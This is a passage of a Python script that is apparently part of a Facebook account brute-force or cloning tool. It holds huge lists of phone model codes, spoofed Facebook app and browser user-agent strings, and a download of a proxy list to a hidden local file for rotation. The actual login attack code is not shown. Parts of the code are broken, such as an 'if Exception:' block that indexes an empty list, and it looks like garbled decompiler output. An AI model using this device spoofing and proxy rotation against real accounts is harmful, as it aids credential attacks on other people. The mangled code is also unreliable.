            'GT-S6810L',
            'GT-S6810M',
            'GT-S6810MBASER',
            'GT-S6810P',
            'GT-S6812',
            'GT-S6812B',
            'GT-S6812C',
            'GT-S6812i',
            'GT-S6818',
            'GT-S6818V',
            'GT-S7230E',
            'GT-S7233E',
            'GT-S7250D',
            'GT-S7262',
            'GT-S7270',
            'GT-S7270L',
            'GT-S7272',
            'GT-S7272C',
            'GT-S7273T',
            'GT-S7278',
            'GT-S7278U',
            'GT-S7390',
            'GT-S7390G',
            'GT-S7390L',
            'GT-S7392',
            'GT-S7392L',
            'GT-S7500',
            'GT-S7500ABABTU',
            'GT-S7500ABADBT',
            'GT-S7500ABTTLP',
            'GT-S7500CWADBT',
            'GT-S7500L',
            'GT-S7500T',
            'GT-S7560',
            'GT-S7560M',
            'GT-S7562',
            'GT-S7562C',
            'GT-S7562i',
            'GT-S7562L',
            'GT-S7566',
            'GT-S7568',
            'GT-S7568I',
            'GT-S7572',
            'GT-S7580E',
            'GT-S7583T',
            'GT-S758X',
            'GT-S7592',
            'GT-S7710',
            'GT-S7710L',
            'GT-S7898',
            'GT-S7898I',
            'GT-S8500',
            'GT-S8530',
            'GT-S8600',
            'GT-STB919',
            'GT-T140',
            'GT-T150',
            'GT-V8a',
            'GT-V8i',
            'GT-VC818',
            'GT-VM919S',
            'GT-W131',
            'GT-W153',
            'GT-X831',
            'GT-X853',
            'GT-X870',
            'GT-X890',
            'GT-Y8750']
        rao = random.choice([
            'CE7',
            'CE7j',
            'CE9h',
            'KE6',
            'KE6j',
            'KF6',
            'KE7',
            'LC8',
            'KD6a',
            'LD7',
            'LD7j',
            'MZ-TECNO LD7',
            'KF6',
            'KF6j',
            'KF6i',
            'KF6k',
            'PR651h',
            'PR651',
            'PR651E',
            'KF6m',
            'KF6h',
            'KF6n'])
        brook = random.choice([
            'X38',
            'C65023',
            'C6506',
            'C6502',
            'D6503',
            'D6502',
            'Xperia Z2',
            'D6633',
            'D6603',
            'D6643',
            'D6616',
            'D6708',
            'D6563',
            'F5122',
            'F5121',
            'E6633',
            'E5553',
            'E6533',
            'E5333'])
        viv = random.choice([
            '2022',
            '2023',
            '2024',
            '2027',
            '2005',
            '2005A',
            '2002A',
            '1955A',
            '1962',
            '1945A',
            '1945T',
            '1937',
            '1938',
            '1938CT',
            '1938T',
            '1940',
            '1935',
            '1936A',
            '1933',
            '1934A',
            '1930A',
            '1930T',
            '1927',
            '1928',
            '1928A',
            '1922A',
            '1923A',
            '1921',
            '1921A',
            '1921T',
            '1915',
            '1916',
            '1908',
            '1909',
            '1832A',
            '1832T',
            '1831A',
            '1831T',
            '1824A',
            '1824BA',
            '1817',
            '1818',
            '1814',
            '1815',
            '1816',
            '1727',
            '1730',
            '1718',
            '1719',
            '1723',
            '1724',
            '1725',
            '1601',
            '1606',
            'F1403',
            '2109',
            '2111',
            '2080A',
            '2085A',
            '2072A',
            '2073A',
            '2056A',
            '2054A',
            '2057A',
            '2047',
            '2037',
            '2036',
            '2038'])
        vmo = random.choice([
            '1902',
            '1906',
            '1901',
            '1904',
            '1938CT',
            '1723',
            '1940',
            '1928A',
            '1909'])
        rmx = random.choice([
            'RMX1941',
            'RMX1945',
            'RMX1921',
            'RMX1901'])
        poc = random.choice([
            'SM-M045F',
            'SM-M045F/DS',
            'SM-T509',
            'SM-A042F',
            'SM-A042F/DS',
            'SM-A042M',
            'SM-A042M/DS',
            'SM-A047F',
            'SM-A047F/DS',
            'SM-A047F/DSN',
            'SM-A045F',
            'SM-A045F/DS',
            'SM-M136B',
            'SM-M136B/DS'])
        gtp = random.choice([
            'GT-1015',
            'GT-1020',
            'GT-1030',
            'GT-1035',
            'GT-1040',
            'GT-1045',
            'GT-1050',
            'GT-1240',
            'GT-1440',
            'GT-1450',
            'GT-18190',
            'GT-18262',
            'GT-19060I',
            'GT-19082',
            'GT-19083',
            'GT-19105',
            'GT-19152',
            'GT-19192',
            'GT-19300',
            'GT-19505',
            'GT-2000',
            'GT-20000',
            'GT-200s',
            'GT-3000',
            'GT-414XOP',
            'GT-6918',
            'GT-7010',
            'GT-7020',
            'GT-7030',
            'GT-7040',
            'GT-7050',
            'GT-7100',
            'GT-7105',
            'GT-7110',
            'GT-7205',
            'GT-7210',
            'GT-7240R',
            'GT-7245',
            'GT-7303',
            'GT-7310',
            'GT-7320',
            'GT-7325',
            'GT-7326',
            'GT-7340',
            'GT-7405',
            'GT-7550   5GT-8005',
            'GT-8010',
            'GT-81',
            'GT-810',
            'GT-8105',
            'GT-8110',
            'GT-8220S',
            'GT-8410',
            'GT-9300',
            'GT-9320',
            'GT-93G',
            'GT-A7100',
            'GT-A9500',
            'GT-ANDROID',
            'GT-B2710',
            'GT-B5330',
            'GT-B5330B',
            'GT-B5330L',
            'GT-B5330ZKAINU',
            'GT-B5510',
            'GT-B5512',
            'GT-B5722',
            'GT-B7510',
            'GT-B7722',
            'GT-B7810',
            'GT-B9150',
            'GT-B9388',
            'GT-C3010',
            'GT-C3262',
            'GT-C3310R',
            'GT-C3312',
            'GT-C3312R',
            'GT-C3313T',
            'GT-C3322',
            'GT-C3322i',
            'GT-C3520',
            'GT-C3520I',
            'GT-C3592',
            'GT-C3595',
            'GT-C3782',
            'GT-C6712',
            'GT-E1282T',
            'GT-E1500',
            'GT-E2200',
            'GT-E2202',
            'GT-E2250',
            'GT-E2252',
            'GT-E2600',
            'GT-E2652W',
            'GT-E3210',
            'GT-E3309',
            'GT-E3309I',
            'GT-E3309T',
            'GT-G530H',
            'GT-g900f',
            'GT-G930F',
            'GT-H9500',
            'GT-I5508',
            'GT-I5801',
            'GT-I6410',
            'GT-I8150',
            'GT-I8160OKLTPA',
            'GT-I8160ZWLTTT',
            'GT-I8258',
            'GT-I8262D',
            'GT-I8268',
            'GT-I8505',
            'GT-I8530BAABTU',
            'GT-I8530BALCHO',
            'GT-I8530BALTTT',
            'GT-I8550E',
            'GT-i8700',
            'GT-I8750',
            'GT-I900',
            'GT-I9008L',
            'GT-i9040',
            'GT-I9080E',
            'GT-I9082C',
            'GT-I9082EWAINU',
            'GT-I9082i',
            'GT-I9100G',
            'GT-I9100LKLCHT',
            'GT-I9100M',
            'GT-I9100P',
            'GT-I9100T',
            'GT-I9105UANDBT',
            'GT-I9128E',
            'GT-I9128I',
            'GT-I9128V',
            'GT-I9158P',
            'GT-I9158V',
            'GT-I9168I',
            'GT-I9192I',
            'GT-I9195H',
            'GT-I9195L',
            'GT-I9250',
            'GT-I9303I',
            'GT-I9305N',
            'GT-I9308I',
            'GT-I9505G',
            'GT-I9505X',
            'GT-I9507V',
            'GT-I9600',
            'GT-m190',
            'GT-M5650',
            'GT-mini',
            'GT-N5000S',
            'GT-N5100',
            'GT-N5105',
            'GT-N5110',
            'GT-N5120',
            'GT-N7000B',
            'GT-N7005',
            'GT-N7100T',
            'GT-N7102',
            'GT-N7105',
            'GT-N7105T',
            'GT-N7108',
            'GT-N7108D',
            'GT-N8000',
            'GT-N8005',
            'GT-N8010',
            'GT-N8020',
            'GT-N9000',
            'GT-N9505',
            'GT-P1000CWAXSA',
            'GT-P1000M',
            'GT-P1000T',
            'GT-P1010',
            'GT-P3100B',
            'GT-P3105',
            'GT-P3108',
            'GT-P3110',
            'GT-P5100',
            'GT-P5200',
            'GT-P5210XD1',
            'GT-P5220',
            'GT-P6200',
            'GT-P6200L',
            'GT-P6201',
            'GT-P6210',
            'GT-P6211',
            'GT-P6800',
            'GT-P7100',
            'GT-P7300',
            'GT-P7300B',
            'GT-P7310',
            'GT-P7320',
            'GT-P7500D',
            'GT-P7500M',
            'GT-P7500R',
            'GT-P7500V',
            'GT-P7501',
            'GT-P7511',
            'GT-S3330',
            'GT-S3332',
            'GT-S3333',
            'GT-S3370',
            'GT-S3518',
            'GT-S3570',
            'GT-S3600i',
            'GT-S3650',
            'GT-S3653W',
            'GT-S3770K',
            'GT-S3770M',
            'GT-S3800W',
            'GT-S3802',
            'GT-S3850',
            'GT-S5220',
            'GT-S5220R',
            'GT-S5222',
            'GT-S5230',
            'GT-S5230W',
            'GT-S5233T',
            'GT-s5233w',
            'GT-S5250',
            'GT-S5253',
            'GT-s5260',
            'GT-S5280',
            'GT-S5282',
            'GT-S5283B',
            'GT-S5292',
            'GT-S5300',
            'GT-S5300L',
            'GT-S5301',
            'GT-S5301B',
            'GT-S5301L',
            'GT-S5302',
            'GT-S5302B',
            'GT-S5303',
            'GT-S5303B',
            'GT-S5310',
            'GT-S5310B',
            'GT-S5310C',
            'GT-S5310E',
            'GT-S5310G',
            'GT-S5310I',
            'GT-S5310L',
            'GT-S5310M',
            'GT-S5310N',
            'GT-S5312',
            'GT-S5312B',
            'GT-S5312C',
            'GT-S5312L',
            'GT-S5330',
            'GT-S5360',
            'GT-S5360B',
            'GT-S5360L',
            'GT-S5360T',
            'GT-S5363',
            'GT-S5367',
            'GT-S5369',
            'GT-S5380',
            'GT-S5380D',
            'GT-S5500',
            'GT-S5560',
            'GT-S5560i',
            'GT-S5570B',
            'GT-S5570I',
            'GT-S5570L',
            'GT-S5578',
            'GT-S5600',
            'GT-S5603',
            'GT-S5610',
            'GT-S5610K',
            'GT-S5611',
            'GT-S5620',
            'GT-S5670',
            'GT-S5670B',
            'GT-S5670HKBZTA',
            'GT-S5690',
            'GT-S5690R',
            'GT-S5830',
            'GT-S5830D',
            'GT-S5830G',
            'GT-S5830i',
            'GT-S5830L',
            'GT-S5830M',
            'GT-S5830T',
            'GT-S5830V',
            'GT-S5831i',
            'GT-S5838',
            'GT-S5839i',
            'GT-S6010',
            'GT-S6010BBABTU',
            'GT-S6012',
            'GT-S6012B',
            'GT-S6102',
            'GT-S6102B',
            'GT-S6293T',
            'GT-S6310B',
            'GT-S6310ZWAMID',
            'GT-S6312',
            'GT-S6313T',
            'GT-S6352',
            'GT-S6500',
            'GT-S6500D',
            'GT-S6500L',
            'GT-S6790',
            'GT-S6790L',
            'GT-S6790N',
            'GT-S6792L',
            'GT-S6800',
            'GT-S6800HKAXFA',
            'GT-S6802',
            'GT-S6810',
            'GT-S6810B',
            'GT-S6810E',
            'GT-S6810L',
            'GT-S6810M',
            'GT-S6810MBASER',
            'GT-S6810P',
            'GT-S6812',
            'GT-S6812B',
            'GT-S6812C',
            'GT-S6812i',
            'GT-S6818',
            'GT-S6818V',
            'GT-S7230E',
            'GT-S7233E',
            'GT-S7250D',
            'GT-S7262',
            'GT-S7270',
            'GT-S7270L',
            'GT-S7272',
            'GT-S7272C',
            'GT-S7273T',
            'GT-S7278',
            'GT-S7278U',
            'GT-S7390',
            'GT-S7390G',
            'GT-S7390L',
            'GT-S7392',
            'GT-S7392L',
            'GT-S7500',
            'GT-S7500ABABTU',
            'GT-S7500ABADBT',
            'GT-S7500ABTTLP',
            'GT-S7500CWADBT',
            'GT-S7500L',
            'GT-S7500T',
            'GT-S7560',
            'GT-S7560M',
            'GT-S7562',
            'GT-S7562C',
            'GT-S7562i',
            'GT-S7562L',
            'GT-S7566',
            'GT-S7568',
            'GT-S7568I',
            'GT-S7572',
            'GT-S7580E',
            'GT-S7583T',
            'GT-S758X',
            'GT-S7592',
            'GT-S7710',
            'GT-S7710L',
            'GT-S7898',
            'GT-S7898I',
            'GT-S8500',
            'GT-S8530',
            'GT-S8600',
            'GT-STB919',
            'GT-T140',
            'GT-T150',
            'GT-V8a',
            'GT-V8i',
            'GT-VC818',
            'GT-VM919S',
            'GT-W131',
            'GT-W153',
            'GT-X831',
            'GT-X853',
            'GT-X870',
            'GT-X890',
            'GT-Y8750'])
        son = random.choice([
            'H8324',
            'H8314',
            'SO-05K',
            'XQ-AU51',
            'XQ-AU52',
            'XQ-AT51',
            'XQ-AT52',
            'SOG01',
            'SO-52A',
            'XQ-AS52',
            'XQ-AS62',
            'XQ-AS72',
            'A002SO, SOG02'])
        rot = random.choice([
            'HUAWEIMYA-L03',
            'HUAWEIMYA-L23',
            'HUAWEIMYA-L02',
            'HUAWEIMYA-L22',
            'HUAWEIMYA-U29',
            'HUAWEIMYA-L13'])
        ams = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 140)) + str(random.randint(111, 556))
        cph = random.choice([
            'CPH1979',
            'CPH1983',
            'CPH1987',
            'CPH2005',
            'CPH2009',
            'CPH2015',
            'CPH2059',
            'CPH2061',
            'CPH2065',
            'CPH2069',
            'CPH2071',
            'CPH2073',
            'CPH2077',
            'CPH2091',
            'CPH2095',
            'CPH2099',
            'CPH2137',
            'CPH2139',
            'CPH2145',
            'CPH2161',
            'CPH2185',
            'CPH2201',
            'CPH2209',
            'CPH1801',
            'CPH1803',
            'CPH1805',
            'CPH1809',
            'CPH1827',
            'CPH1837',
            'CPH1851',
            'CPH1853'])
        zov = random.choice([
            'LE2113',
            'LE2111',
            'LE2110',
            'LE2117',
            'LE2115',
            'LE2121',
            'LE2125',
            'LE2123',
            'LE2120',
            'LE2127',
            'EB2101',
            'EB2103',
            'DE2118',
            'DE2117',
            'DN2101',
            'DN2103',
            'MT2110',
            'MT2111'])
        rmx = random.choice([
            'RMX1603',
            'RMX1801',
            'RMX1805',
            'RMX1807',
            'RMX1809',
            'RMX1811',
            'RMX1821',
            'RMX1825',
            'RMX1827',
            'RMX1831',
            'RMX1833',
            'RMX1851',
            'RMX1901',
            'RMX1903',
            'RMX1911',
            'RMX1919',
            'RMX1921',
            'RMX1925',
            'RMX1931',
            'RMX1941',
            'RMX1945',
            'RMX1971',
            'RMX1991',
            'RMX1992',
            'RMX1993',
            'RMX2001',
            'RMX2002',
            'RMX2002',
            'RMX2002',
            'RMX2020',
            'RMX2020',
            'RMX2021',
            'RMX2025',
            'RMX2027',
            'RMX2027',
            'RMX2030',
            'RMX2032',
            'RMX2040',
            'RMX2040',
            'RMX2050',
            'RMX2051',
            'RMX2061',
            'RMX2063',
            'RMX2071',
            'RMX2072',
            'RMX2075',
            'RMX2076',
            'RMX2081',
            'RMX2083',
            'RMX2085',
            'RMX2086',
            'RMX2101',
            'RMX2103',
            'RMX2111',
            'RMX2111',
            'RMX2117',
            'RMX2121',
            'RMX2142',
            'RMX2144',
            'RMX2151',
            'RMX2155',
            'RMX2156',
            'RMX2161',
            'RMX2163',
            'RMX2170',
            'RMX2176',
            'RMX2180',
            'RMX2185',
            'RMX2189',
            'RMX2193',
            'RMX2195',
            'RMX2202',
            'RMX3031',
            'RMX3061',
            'RMX3063',
            'RMX3081',
            'RMX3085',
            'RMX3092',
            'RMX3171',
            'RMX3191',
            'RMX3193',
            'RMX3195',
            'RMX3197',
            'RMX3201',
            'RMX3231',
            'RMX3241',
            'RMX3242'])
        net = random.choice([
            '281',
            '282',
            '283',
            '284',
            '285',
            '286',
            '287',
            '288',
            '289',
            '290',
            '291',
            '292',
            '293',
            '382',
            '383',
            '370',
            '394',
            '301',
            '310',
            '311',
            '319',
            '350',
            '378',
            '360',
            '344'])
        noti = random.choice([
            '9',
            '10',
            '11',
            '12'])
        mmn = random.choice([
            'LM-V510N',
            'SM-G970F',
            'SM-A107M',
            'OnePlus BE2015',
            'OnePlus BE2025',
            'OnePlus BE2028',
            'HUAWEI MAR-LX1M',
            'Pixel 3',
            'SM-G996U',
            'SM-G980F',
            'SM-G960U',
            'HUAWEI MAR-LX1A',
            'CP3503L',
            'Coolpad 2039',
            'SM-A025G',
            'SM-J610FN',
            'LG-D802',
            'LG L40',
            'LMK200Z',
            'LMK200E',
            'LMK200B',
            'LM-K200'])
        hwi = random.choice([
            'YAL-L21',
            'ELE-L04',
            'LYA-L29',
            'ELE-L29',
            'VOG-L09',
            'MAR-LX1B',
            'HLK-AL00',
            'JNY-LX2',
            'MAR-LX3A'])
        gts = random.choice([
            'AD9',
            'AD8',
            'LG7n',
            'LG8n',
            'LG6n',
            'KG5p',
            'CI7n',
            'CI8',
            'CI8n',
            'CI6n',
            'CH6i'])
        tco = random.choice([
            'RB8S',
            'KC8S',
            'KC6',
            'KC2',
            'CC7',
            'CB7'])
        bio = random.choice([
            'SM-G6100',
            'SM-G610L',
            'SM-G610K',
            'SM-G615F',
            'SM-G615FU',
            'SM-J730G',
            'SM-J730GM',
            'SM-G9298',
            'SM-G615F, SM-G615FU',
            'SM-C7010',
            'SM-C701F',
            'SM-C7018',
            'SM-J710FN',
            'SM-A520F',
            'SM-A520F',
            'SM-A520K',
            'SM-A520L',
            'SM-A520S',
            'SM-A520W',
            'SM-A720F',
            'SM-A720S',
            'SM-C5010',
            'SM-C5018',
            'SM-C9000',
            'SM-C900F',
            'SM-C9008',
            'SM-C900Y',
            'SM-A8100',
            'SM-A810F',
            'SM-A810F',
            'SM-A810YZ',
            'SM-A810S',
            'SM-J111F',
            'SM-J110G',
            'SM-J110F',
            'SM-J110H',
            'SM-J110M',
            'SM-J110L',
            'SM-J111M',
            'SM-J105F',
            'SM-j105H',
            'SM-J105H',
            'SM-J105B',
            'SM-J105Y',
            'SM-J105M',
            'SM-G388F',
            'R3',
            'SM-J106F',
            'SM-J106B',
            'SM-J106H',
            'SM-J106M',
            'SM-J701F',
            'SM-J701F',
            'SM-J701M',
            'SM-J701MT',
            'SO-02H',
            'E5823',
            'E5803',
            'SM-J720F',
            'SM-J720F/DS',
            'SM-J720M',
            'SM-J720M/DS',
            'X00ID',
            'X00IS',
            'X00HDA',
            'ZC554KL',
            'XT1766',
            'XT1763',
            'G3116',
            'G3121',
            'G3112',
            'G3123',
            'G3125',
            'SM-A605FN',
            'SM-A605G',
            'SM-A605F',
            'SM-A605GN',
            'SM-A6050',
            'SM-A605K',
            'SM-A605X',
            'SM-A6058',
            'SM-A750F',
            'SM-A750FN',
            'SM-A750G',
            'SM-A750GN',
            'SM-A750C',
            'SM-A750X',
            'SM-A750N',
            'SM-G885F',
            'SM-G8850',
            'SM-G885Y',
            'SM-G885S',
            'SM-G8858',
            'SM-J111F',
            'SM-J110G',
            'SM-J110F',
            'SM-J110H',
            'SM-J110M',
            'SM-J110L',
            'SM-J111M',
            'SM-J105F',
            'SM-j105H',
            'SM-J105H',
            'SM-J105B',
            'SM-J105Y',
            'SM-J105M',
            'SM-G388F',
            'R3',
            'SM-J106F',
            'SM-J106B',
            'SM-J106H',
            'SM-J106M',
            'SM-J250F',
            'SM-J250G',
            'SM-J250F',
            'SM-J250M',
            'SM-J250Y',
            'SM-A260F',
            'SM-A260G',
            'SM-G532F',
            'SM-G532G',
            'SM-G532M',
            'SM-G532G',
            'SM-G532F',
            'SM-G532MT',
            'MT7-TL00',
            'MT7-L09',
            'MT7-TL10',
            'MT7-CL00',
            'MT7-UL00',
            'PRA-TL10',
            'PRA-TL20',
            'PRA-LA1',
            'PRA-LX1',
            'PRA-LX2',
            'TAG-L21',
            'PRA-AL00X',
            'TAG-L32',
            'PRA-LX3',
            'PRA-AL00',
            'EVA-L09',
            'EVA-L19',
            'EVA-L29',
            'EVA-AL10',
            'EVA-TL00',
            'EVA-AL00',
            'EVA-DL00',
            'SLA-L02',
            'SLA-L22',
            'SLA-L03',
            'SLA-L23',
            'WAS-LX1',
            'WAS-LX2',
            'WAS-LX3',
            'WAS-LX1A',
            'WAS-LX2J',
            'WAS-L03T',
            'WAS-AL00',
            'WAS-TL10',
            'POT-LX1',
            'POT-LX1AF',
            'POT-LX2J',
            'POT-LX1RUA',
            'POT-LX3',
            'HMA-L09',
            'HMA-LX9',
            'HMA-L29',
            'HMA-AL00',
            'HMA-TL00',
            'LIO-L09',
            'LIO-L29',
            'LIO-AL00',
            'LIO-TL00',
            'MYA-L03',
            'MYA-L23',
            'MYA-L02, MYA-L22',
            'MYA-U29',
            'MYA-L13',
            'DUB-LX1',
            'DUB-LX3',
            'DUB-LX1'])
        mui = random.choice([
            'M2004J19G',
            'M2004J19C'])
        red = random.choice([
            'M1803E6G',
            'M1803E6H',
            'M1803E6I',
            'M1803E7SG',
            'M1803E7SH',
            'M1804C3DG',
            'M1804C3DH',
            'M1804C3DI',
            'M1806E7TG',
            'M1806E7TH',
            'M1806E7TI',
            'M2004J19G',
            'M2004J19C'])
        bik = random.choice([
            'X017DA',
            'X018D',
            'A009',
            'X00LD',
            'X015D',
            'Z01KS',
            'Z01MDA',
            'ASUS_X00KD',
            'ASUS_A002A',
            'ASUS_X013'])
        inf = random.choice([
            'X682B',
            'X682C',
            'X680B',
            'X688B'])
        inform = random.choice([
            'PR652B',
            'X267',
            'X5010',
            'X521',
            'X5514D',
            'X5515',
            'X5515F',
            'X559',
            'X559C',
            'X559F',
            'X571',
            'X572',
            'X573',
            'X573B',
            'X601',
            'X603',
            'X604',
            'X604B',
            'X605',
            'X606',
            'X606B',
            'X606C',
            'X606D',
            'X608',
            'X609',
            'X610',
            'X610B',
            'X612',
            'X612B',
            'X620',
            'X620B',
            'X622',
            'X623',
            'X623B',
            'X624',
            'X624B',
            'X625',
            'X625B',
            'X625D',
            'X626',
            'X626B',
            'X627V',
            'X650',
            'X650B',
            'X650C',
            'X650D',
            'X652',
            'X652A',
            'X652B',
            'X652C',
            'X653',
            'X653C',
            'X655',
            'X655C',
            'X655D',
            'X655F',
            'X656',
            'X657',
            'X657B',
            'X657C',
            'X659B',
            'X660',
            'X660B',
            'X660C',
            'X680',
            'X680B',
            'X680C',
            'X682B',
            'X682C',
            'X683',
            'X687',
            'X687B',
            'X688B',
            'X688C',
            'X688C',
            'X689',
            'X689B',
            'X689C',
            'X690',
            'X690B',
            'X692',
            'X693',
            'X695',
            'X695C'])
        fbbv = str(random.randint(111111111, 999999999))
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        uazz = f'''[FBAN/MobileAdsManagerAndroid;FBAV/{net}.0.0.21.117;FBPN/com.facebook.adsmanager;FBLC/en_US;FBBV/{fbbv};FBCR/null;FBMF/TECNO;FBBD/TECNO;FBDV/{poc};FBSV/12;FBCA/arm64-v8a;FBDM/''' + '{density=2.75,width=1080,height=2216};FBOP/1;]'
        ugm = '[FBAN/FB4A;FBAV/' + net + '.0.0.77.46;FBBV/251145743;FBDM/{density=2.625,width=1080,height=1920};FBLC/pt_BR;FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/Zong;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/' + zov + ';FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
        ugen2 = []
        ugen = []
        cokbrut = []
        ses = requests.Session()
        princp = []
        prox = requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
        open('.prox.txt', 'w').write(prox)
        if Exception:
            e = [][{
                'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.3',
                'pct': 34.01 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.3',
                'pct': 16.33 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.',
                'pct': 6.8 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.',
                'pct': 5.44 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.3',
                'pct': 5.44 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
                'pct': 2.72 }][{
                'ua': 'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.',
                'pct': 2.72 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
                'pct': 2.38 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 11; moto e20 Build/RONS31.267-94-14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.3',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.3',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.3',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/288.0.576558892 Mobile/15E148 Safari/604.',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M236B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.3',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 10; SNE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.154 Mobile Safari/537.36 OPR/78.2.4143.7548',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
                'pct': 1.36 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
                'pct': 0.68 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/288.0.576558892 Mobile/15E148 Safari/604.1',
                'pct': 0.68 }][{
                'ua': 'Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36',
                'pct': 0.34 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                'pct': 0.34 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1',
                'pct': 0.34 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                'pct': 0.34 }][{
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1',
                'pct': 0.34 }][{
                'ua': 'Mozilla/5.0 (Linux; U; Android 11; zh-cn; 21091116C Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/15.7.23',
                'pct': 0.34 }]
            e = None
            del e
            e = None
            del e
prox = open('.prox.txt', 'r').read().splitlines()
for xd in range(100000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
